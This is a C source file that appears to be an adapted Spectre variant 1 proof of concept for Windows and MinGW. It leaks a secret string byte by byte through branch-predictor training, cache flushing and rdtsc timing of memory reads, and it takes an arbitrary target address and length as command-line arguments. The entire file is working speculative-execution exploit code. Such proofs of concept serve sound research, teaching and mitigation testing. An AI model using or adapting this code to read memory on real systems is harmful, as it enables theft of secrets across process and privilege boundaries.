#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h>       // for rdtscp and clflush
#pragma optimize("gt",on)
#else
#include <x86intrin.h>    // for rdtscp and clflush
#endif

/*
Checked out under Win7x64 using MSVC2010 (x86 code in "Debug" Build (no optimizations)) as a C++ Win32
  Console Application (uncheck pre-compiled header).
Command Line Arguments (defaults): Cache Hit Threshold (80), Success Addition Factor (0),
                                   Success Multiplier (2) & Previous 2 Memory Address Arguments in
								   Original Source.
Dependencies: MSVCR100D.DLL (x86 version for Debug Build, or MSVCR100.DLL (x86 version for Run Build)
Should run on older CPUs not supporting __rdtscp (uses __rdtsc()), as well as newer CPUs, but rdtscp is
  preferred for new CPUs.
  
| Also compiles with MinGW64 (64-bit) without modification.  This config/install was used as a test:
|   http://www.willus.com/mingw/mingw720_20171020.html
|   (using go64.bat with "goclear.bat" line commented out, since it wasn't defined/given
|   in the distribution)
*/

/********************************************************************
Victim code
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64]; uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 }; uint8_t unused2[64];
uint8_t array2[256 * 512];
char *secret = "The Magic Words are Squeamish Ossifrage.";
uint8_t temp = 0;  // Used so compiler won’t optimize out victim_function()

void victim_function(size_t x) { if (x < array1_size) temp &= array2[array1[x] * 512]; }


/********************************************************************
Analysis code
********************************************************************/
// assume cache hit if time <= threshold
int cache_hit_threshold = 80; int addition = 0; int multiplier = 2;

// Report best guess in value[0] and runner-up in value[1]
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
  {
    static int results[256]; int tries, i, j, k, mix_i = 0;  unsigned int junk = 0;
    size_t training_x, x; register uint64_t time1, time2; volatile uint8_t *addr;  volatile int z;

    for (i = 0; i < 256; i++) results[i] = 0;
    for (tries = 999; tries > 0; tries--)
      {
        // Flush array2[256*(0..255)] from cache
        for (i=0; i<256; i++) _mm_clflush(&array2[i*512]);  // intrinsic for clflush instruction

        // 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x)
        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--)
          {
            _mm_clflush(&array1_size);
            for (z = 0; z < 100; z++) {}  // Delay (can also mfence)

            // Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0
            // Avoid jumps in case those tip off the branch predictor
            x = ((j % 6) - 1) & ~0xFFFF;   // Set x=FFF.FF0000 if j%6==0, else x=0
            x = (x | (x >> 16));           // Set x=-1 if j&6=0, else x=0
            x = training_x ^ (x & (malicious_x ^ training_x));

            victim_function(x);  // Call the victim!
          }

        // Time reads. Order is lightly mixed up to prevent stride prediction
        for (i = 0; i < 256; i++)
          {
            mix_i = ((i * 167) + 13) & 255; addr = &array2[mix_i * 512];
            _mm_lfence(); time1 = __rdtsc(); // READ TIMER, FENCED TO ENSURE SERIALIZATION (old CPU compatibility)
            junk = *addr;                    // MEMORY ACCESS TO TIME
            _mm_lfence(); time2 = __rdtsc() - time1; // READ TIMER & COMPUTE ELAPSED TIME, (FENCED)
            if (time2<=cache_hit_threshold && mix_i!=array1[tries%array1_size]) results[mix_i]++; // cache hit
          }

        // Locate highest & second-highest results, tallies in j/k
        j=k=-1;
        for (i= 0; i<256; i++)
          {
            if (j<0 || results[i]>=results[j]) { k=j; j=i; }
             else if (k<0 || results[i]>=results[k]) k=i;
          }
        // Clear success if best is > 2*runner-up + 5 or 2/0)
        if ((results[j]>=(2*results[k]+5))||(results[j]==2 && results[k]==0)) break;
      }
    results[0] ^= junk;  // use junk so code above won’t get optimized out
    value[0] = (uint8_t)j; score[0] = results[j]; value[1] = (uint8_t)k; score[1] = results[k];
  }

int main(int argc, const char** argv)
  {
    size_t malicious_x=(size_t)(secret-(char*)array1);   // default for malicious_x
    int i, score[2], len=40; uint8_t value[2]; int Successful;

    for (i = 0; i < sizeof(array2); i++) array2[i] = 1;  // write to array2 so in RAM not copy-on-write zero pages

    // Handle Command Line Arguments, if any
    if (argc > 1) sscanf(argv[1], "%d", &cache_hit_threshold);
    if (argc > 2) sscanf(argv[2], "%d", &addition);
    if (argc > 3) sscanf(argv[3], "%d", &multiplier);
    if (argc == 6)
      { 
        sscanf(argv[4], "%p", (void**)(&malicious_x));
        malicious_x -= (size_t)array1;  // Convert input value into a pointer
        sscanf(argv[5], "%d", &len);
      }

    printf("Reading %d bytes with Cache Hit Threshold of %d, addition value of %d & multiplier of %d:\n",
           len, cache_hit_threshold, addition, multiplier);
    while (--len >= 0)
      {
        printf("Reading at malicious_x = %p... ", (void*)malicious_x);
        do
          {
            readMemoryByte(malicious_x,value,score);
            Successful = (score[0]==2 && score[1]==0) ||
                         (score[0]>=multiplier*score[1]+addition && !(score[0]==3 && score[1]==0));
          }
        while (!Successful);
        printf("%s: ", Successful ? "Success" : "Unclear");
        printf("0x%02X=\'%c\' score=%3d ",value[0],(value[0]>31 && value[0]<127 ? value[0] : '?'),score[0]);
        if (score[1] > 0) printf("(second best: 0x%02X score=%3d)", value[1], score[1]);
        printf("\n");
        malicious_x++;
      }
    return (0);
  }
